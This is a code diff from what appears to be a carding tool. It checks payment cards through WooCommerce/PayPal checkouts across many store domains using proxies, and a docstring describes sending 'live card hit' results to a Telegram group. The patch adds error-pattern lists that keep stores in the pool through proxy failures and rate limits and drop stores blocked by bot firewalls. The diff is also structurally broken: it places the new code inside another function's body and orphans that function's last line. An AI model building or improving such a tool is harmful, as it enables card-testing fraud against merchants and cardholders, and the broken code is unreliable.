@@ -138,6 +138,61 @@ threading.Thread(target=_reaper, daemon=True).start()
 # ── Telegram sender (wraps utils.send_telegram) ──────────────────────────────
 def _tg_live(text: str) -> None:
     """Send live card hit to the configured Telegram group via utils.send_telegram."""
+
+
+# ── Bad-site classifier ───────────────────────────────────────────────────────
+# Only structural site errors should permanently remove a domain from the pool.
+# Proxy/network failures and transient WordPress errors keep the domain alive.
+
+_BAD_SITE_PATTERNS = [
+    "could not find product",   # no product on store
+    "add to cart failed",        # store has no cart / incompatible
+    "not a pymntpl-paypal store", # wrong gateway
+    "bot/firewall",              # cloudflare / ddos-guard / captcha
+    "non-json response",         # not a WooCommerce store
+    "cart empty",                # persistent empty-cart (ATC broken at site level)
+]
+
+_KEEP_DOMAIN_PATTERNS = [
+    "proxy",                     # ProxyError, proxy refused, etc.
+    "connection",                # ConnectionError, ConnectionReset
+    "timeout",                   # read/connect timeout
+    "ssl",                       # SSL handshake errors
+    "remote",                    # RemoteDisconnected
+    "network",                   # generic network
+    "max retries",               # urllib3 retry loop exhausted
+    "critical error on this website",  # transient WordPress fatal
+    "atc error:",                # ATC threw exception (likely proxy)
+    "checkout load:",            # network error loading checkout page
+    "checkout fetch:",           # same
+    "checkout post:",            # network error on checkout POST
+    "checkout submit:",          # same
+    "create order error:",       # PayPal order creation network error
+    "config parse error:",       # transient parse issue
+    "order creation failed",     # transient
+    "empty response",            # proxy returned nothing
+    "rate limit",                # 429 — transient
+    "http 429",
+    "http 503",
+    "http 403",
+]
+
+
+def _is_bad_site_error(message: str) -> bool:
+    """Return True only for permanent structural site failures.
+    Proxy/network/transient errors return False (domain is kept).
+    """
+    msg = message.lower()
+    # Proxy/network/transient → always keep domain
+    for pat in _KEEP_DOMAIN_PATTERNS:
+        if pat in msg:
+            return False
+    # Structural site error → mark bad
+    for pat in _BAD_SITE_PATTERNS:
+        if pat in msg:
+            return True
+    return False
+
     threading.Thread(target=send_telegram, args=(text,), daemon=True).start()
 
 
@@ -210,8 +265,8 @@ def _scan_worker(
 
                 result["domain"] = domain
 
-                # First-attempt error → mark domain bad, retry on a good domain
-                if result["status"] == "unknown" and attempt == 0:
+                # First-attempt structural error → mark domain bad, retry on a good domain
+                if result["status"] == "unknown" and attempt == 0 and _is_bad_site_error(result["message"]):
                     with _rr_lock:
                         _bad_domains.add(domain)
                     new_bad_domain = domain
